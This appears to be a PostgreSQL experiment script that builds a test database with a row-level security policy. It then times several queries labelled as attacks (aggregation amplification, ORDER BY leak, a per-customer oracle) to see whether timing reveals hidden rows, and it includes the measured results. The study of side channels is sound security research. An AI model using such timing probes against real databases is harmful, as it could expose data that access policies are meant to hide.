------------------------------------------------------------
-- CLEANUP
------------------------------------------------------------

DROP TABLE IF EXISTS store_sales CASCADE;
DROP TABLE IF EXISTS customer CASCADE;
DROP TABLE IF EXISTS timing_runs CASCADE;
DROP TABLE IF EXISTS timing_summary CASCADE;
--DROP ROLE IF EXISTS rls_user;

------------------------------------------------------------
-- BASE TABLES
------------------------------------------------------------

CREATE TABLE customer (
    c_customer_sk INT PRIMARY KEY,
    c_first_name  TEXT,
    c_last_name   TEXT
);

CREATE TABLE store_sales (
    ss_sold_date  DATE,
    ss_customer_sk INT,
    ss_net_paid    NUMERIC
);

------------------------------------------------------------
-- DATA POPULATION
------------------------------------------------------------

-- 1000 customers
INSERT INTO customer
SELECT i, 'Name_'||i, 'Last_'||i
FROM generate_series(1,1000) AS s(i);

-- 20,000 sales rows (random distribution)
INSERT INTO store_sales
SELECT CURRENT_DATE,
       (random()*999 + 1)::INT,
       (random()*2000)::NUMERIC
FROM generate_series(1,20000);

------------------------------------------------------------
-- INDEXES (critical for optimizer behavior)
------------------------------------------------------------

CREATE INDEX idx_sales_customer ON store_sales(ss_customer_sk);
CREATE INDEX idx_sales_paid ON store_sales(ss_net_paid);

ANALYZE;

------------------------------------------------------------
-- ENABLE RLS
------------------------------------------------------------

ALTER TABLE customer ENABLE ROW LEVEL SECURITY;

CREATE POLICY customer_policy
ON customer
USING (
    c_customer_sk IN (
        SELECT ss_customer_sk
        FROM store_sales
        WHERE ss_net_paid > 1000
    )
);

------------------------------------------------------------
-- CREATE RLS USER
------------------------------------------------------------

--CREATE ROLE rls_user LOGIN PASSWORD 'rls_pass';

--GRANT CONNECT ON DATABASE tpch TO rls_user;
--GRANT USAGE ON SCHEMA public TO rls_user;

GRANT SELECT ON customer TO rls_user;
GRANT SELECT ON store_sales TO rls_user;

------------------------------------------------------------
-- TIMING TABLES
------------------------------------------------------------

CREATE TABLE timing_runs (
    attack_name TEXT,
    run_no INT,
    exec_ms NUMERIC
);

CREATE TABLE timing_summary (
    attack_name TEXT,
    avg_ms NUMERIC,
    min_ms NUMERIC,
    max_ms NUMERIC
);

GRANT ALL ON timing_runs TO rls_user;
GRANT ALL ON timing_summary TO rls_user;

------------------------------------------------------------
-- GENERIC TIMER WRAPPER
------------------------------------------------------------

CREATE OR REPLACE FUNCTION record_timing(
    attack TEXT,
    run_id INT,
    sql_query TEXT
)
RETURNS VOID AS $$
DECLARE
    t1 TIMESTAMP;
    t2 TIMESTAMP;
BEGIN
    t1 := clock_timestamp();
    EXECUTE sql_query;
    t2 := clock_timestamp();

    INSERT INTO timing_runs
    VALUES (
        attack,
        run_id,
        EXTRACT(EPOCH FROM (t2 - t1)) * 1000
    );
END;
$$ LANGUAGE plpgsql SECURITY INVOKER;

------------------------------------------------------------
-- PROBE DEFINITIONS
------------------------------------------------------------

------------------------------------------------------------
-- 1. BASELINE
------------------------------------------------------------
CREATE OR REPLACE FUNCTION probe_baseline(run_id INT)
RETURNS VOID AS $$
BEGIN
    PERFORM record_timing(
        'baseline_scan',
        run_id,
        $q$
        SELECT DISTINCT c.*
        FROM customer c
        $q$
    );
END;
$$ LANGUAGE plpgsql SECURITY INVOKER;

------------------------------------------------------------
-- 2. AGGREGATION AMPLIFICATION
------------------------------------------------------------
CREATE OR REPLACE FUNCTION probe_amplification(run_id INT)
RETURNS VOID AS $$
BEGIN
    PERFORM record_timing(
        'aggregation_amplification',
        run_id,
        $q$
        SELECT DISTINCT c.*
        FROM customer c
        JOIN store_sales ss
          ON c.c_customer_sk = ss.ss_customer_sk
        WHERE ss.ss_net_paid < 1500
        $q$
    );
END;
$$ LANGUAGE plpgsql SECURITY INVOKER;

------------------------------------------------------------
-- 3. GROUP COLLAPSE
------------------------------------------------------------
CREATE OR REPLACE FUNCTION probe_group_collapse(run_id INT)
RETURNS VOID AS $$
BEGIN
    PERFORM record_timing(
        'group_collapse',
        run_id,
        $q$
        SELECT c.c_customer_sk, COUNT(*)
        FROM customer c
        GROUP BY c.c_customer_sk
        HAVING COUNT(*) > 0
        $q$
    );
END;
$$ LANGUAGE plpgsql SECURITY INVOKER;

------------------------------------------------------------
-- 4. ORDER BY LEAK
------------------------------------------------------------
CREATE OR REPLACE FUNCTION probe_order_by(run_id INT)
RETURNS VOID AS $$
BEGIN
    PERFORM record_timing(
        'order_by_leak',
        run_id,
        $q$
        SELECT DISTINCT c.*
        FROM customer c
        ORDER BY c.c_customer_sk
        $q$
    );
END;
$$ LANGUAGE plpgsql SECURITY INVOKER;

------------------------------------------------------------
-- 5. PER-CUSTOMER ORACLE
------------------------------------------------------------
CREATE OR REPLACE FUNCTION probe_per_customer(run_id INT, cust INT)
RETURNS VOID AS $$
DECLARE
    attack_label TEXT;
BEGIN
    attack_label := 'per_customer_oracle (' || cust || ')';

    PERFORM record_timing(
        attack_label,
        run_id,
        format(
            'SELECT * FROM customer WHERE c_customer_sk = %s',
            cust
        )
    );
END;
$$ LANGUAGE plpgsql SECURITY INVOKER;


------------------------------------------------------------
-- EXECUTE ALL PROBES 30 TIMES
------------------------------------------------------------
set role 'rls_user';
DO $$
DECLARE
    i INT;
BEGIN
    FOR i IN 1..30 LOOP
        PERFORM probe_baseline(i);
        PERFORM probe_amplification(i);
        PERFORM probe_group_collapse(i);
        PERFORM probe_order_by(i);

        PERFORM probe_per_customer(i,1);
        PERFORM probe_per_customer(i,2);
        PERFORM probe_per_customer(i,3);
        PERFORM probe_per_customer(i,4);
        PERFORM probe_per_customer(i,5);
    END LOOP;
END;
$$;

------------------------------------------------------------
-- AGGREGATE RESULTS
------------------------------------------------------------

INSERT INTO timing_summary
SELECT attack_name,
       ROUND(AVG(exec_ms),4),
       ROUND(MIN(exec_ms),4),
       ROUND(MAX(exec_ms),4)
FROM timing_runs
GROUP BY attack_name
ORDER BY attack_name;

------------------------------------------------------------
-- VIEW RESULTS
------------------------------------------------------------

SELECT * FROM timing_summary;

--------------------------------------------------------------
--- Office machine output 
--------------------------------------------------------------
"aggregation_amplification"	6.0656	5.8520	6.6770
"baseline_scan"	2.1223	2.0300	2.7460
"group_collapse"	2.0845	1.9830	2.7580
"order_by_leak"	1.9534	1.8770	2.1780
"per_customer_oracle (1)"	1.7791	1.6980	2.2910
"per_customer_oracle (2)"	1.7582	1.6730	2.1760
"per_customer_oracle (3)"	1.7575	1.7130	1.9490
"per_customer_oracle (4)"	1.7566	1.6880	2.2630
"per_customer_oracle (5)"	1.7409	1.6780	1.9720
